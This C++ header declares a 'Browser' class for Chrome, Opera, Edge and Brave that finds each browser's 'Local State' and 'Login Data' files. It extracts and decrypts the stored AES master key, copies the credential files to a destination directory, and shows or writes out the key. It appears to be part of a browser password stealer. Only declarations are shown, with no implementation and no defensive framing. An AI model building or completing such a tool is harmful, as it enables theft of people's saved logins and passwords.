#pragma once

#include <iostream>
#include <vector>

#define AES_KEY_SIZE_IN_BYTES	 	32			// would be better if we could make it a static variable of Browser

class Browser {

private:
	std::string					BrowserName;
	std::string					EncryptedKeyPATH;		// Path of file which contains the encrypted key i.e. Local State	
	std::vector<std::string>	LoginDataPath;			// Path of file which contains the profile data  i.e. Login Data			
	unsigned char AES_KEY [AES_KEY_SIZE_IN_BYTES + 1];

//public:
//	enum class SupportedBrowser{
//		Google,
//		Opera,
//		Firefox,
//		Edge,
//		Brave
//	};

public:		// Static variables
	static const std::vector<std::string> relativePaths;
	static const std::vector<std::string> impFiles;
	static const unsigned int CHROME_BASE64_KEY_LENGTH = 356;
	static const unsigned int BRAVE_BASE64_KEY_LENGTH  = 356;
	static const unsigned int OPERA_BASE64_KEY_LENGTH  = 356;
	static const unsigned int EDGE_BASE64_KEY_LENGTH   = 356;

private:
	std::string extractEncryptedKey(const std::string& jsonData);
	bool isImportantFile(const std::string& path);
	void populateKeyAndStateFiles(const std::vector<std::string> &path);
	std::string getEncryptedMasterKey(void);
	std::string decryptMasterKey(const std::string& encryptedKey);

public:
	void ExtractKey(const std::vector<std::string>& path, const unsigned int& b64_key_length);
	void ExtractFiles(const std::vector<std::string>& paths, const std::string& destinationDir);
	void ShowKey(void);
	void WriteExtractedKeyToFile(const std::string &path);
	std::string BrowserNameFinder(const std::string path);
};